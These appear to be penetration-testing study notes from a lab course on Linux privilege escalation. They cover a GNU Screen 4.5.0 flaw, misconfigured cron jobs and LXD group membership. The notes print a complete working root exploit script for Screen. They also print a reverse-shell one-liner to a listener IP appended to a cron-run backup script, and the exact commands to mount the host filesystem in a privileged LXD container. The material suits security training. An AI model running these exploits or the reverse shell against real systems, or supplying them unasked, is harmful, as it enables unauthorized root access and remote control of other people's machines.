# 🍑 Service-based Privilege Escalation

## Vulnerable Services

Many services may be found, which have flaws that can be leveraged to escalate privileges. An example is the popular terminal multiplexer [Screen](https://linux.die.net/man/1/screen). Version 4.5.0 suffers from a privilege escalation vulnerability due to a lack of a permissions check when opening a log file.

```shell-session
ElFelixi0@htb[/htb]$ screen -v

Screen version 4.05.00 (GNU) 10-Dec-16
```

This allows an attacker to truncate any file or create a file owned by root in any directory and ultimately gain full root access.

Here is the POC ->

```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```

## Cron Job Abuse

Cron jobs are  typically used for administrative tasks such as running backups, cleaning up directories, etc. The `crontab` command can create a cron file, which will be run by the cron daemon on the schedule specified

&#x20;the cron file will be created in `/var/spool/cron` for the specific user that creates it. Each entry in the crontab file requires six items in the following order: minutes, hours, days, months, weeks, commands. For example, the entry `0 */12 * * * /home/admin/backup.sh` would run every 12 hours.

Certain applications create cron files in the `/etc/cron.d` directory and may be misconfigured to allow a non-root user to edit them.

let's look around the system for any writeable files or directories

```shell-session
ElFelixi0@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
/sys/fs/cgroup/memory/init.scope/cgroup.event_control
<SNIP>
/home/backupsvc/backup.sh
<SNIP>
```

`backup.sh` in the `/dmz-backups` directory is interesting and seems like it could be running on a cron job.

and if we look at the `/dmz-backups` directory, it shows what appears to be files created every three minutes.

Perhaps the sysadmin meant to specify every three hours like `0 */3 * * *` but instead wrote `*/3 * * * *`

We can confirm that a cron job is running using [pspy](https://github.com/DominicBreuker/pspy), a command-line tool used to view running processes without the need for root privileges

&#x20;`-pf` flag tells the tool to print commands and file system events and `-i 1000` tells it to scan [procfs](https://man7.org/linux/man-pages/man5/procfs.5.html) every 1000ms

```shell-session
./pspy64 -pf -i 1000
```

So the output of this would indeed confirm this script is used in a cronjob, so we can try and modify it and appen a bash one liner reverse shell in it ->

```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
#add this -> 
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

and after running a netcat  listerner, we can wait for our reverse shell to hit&#x20;

## Containers

{% hint style="info" %}
Containers operate at the operating system level and virtual machines at the hardware level. Containers thus share an operating system and isolate application processes from the rest of the system, while classic virtualization allows multiple operating systems to run simultaneously on a single system.
{% endhint %}

Linux Containers (`LXC`) is an operating system-level virtualization technique that allows multiple Linux systems to run in isolation from each other on a single host by owning their own processes but sharing the host system kernel for them.

Linux Daemon ([LXD](https://github.com/lxc/lxd)) is similar in some respects but is designed to contain a complete operating system. Thus it is not an application container but a system container. Before we can use this service to escalate our privileges, we must be in either the `lxc` or `lxd` group. To check our group we can use the `id` command ->

```shell-session
uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

Now to abuse LXC or LXD We can either create our own container and transfer it to the target system or use an existing container. administrators often use templates that have little to no security that often don't have passwords ->

```shell-session
container-user@nix02:~$ cd ContainerImages
container-user@nix02:~$ ls

ubuntu-template.tar.xz
```

To exploit this we need to import this container as an image.

```shell-session
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
container-user@nix02:~$ lxc image list
```

Then we can initiate the image and configure it by specifying the `security.privileged` flag and the root path for the container. This flag disables all isolation features that allow us to act on the host.

```shell-session
container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true
container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

And now we can start the container and log into it. In the container, we can then go to the path we specified to access the `resource` of the host system as `root`.

```shell-session
container-user@nix02:~$ lxc start privesc
container-user@nix02:~$ lxc exec privesc /bin/bash
#or
container-user@nix02:~$ lxc exec privesc /bin/sh
root@nix02:~# ls -l /mnt/root                    
```
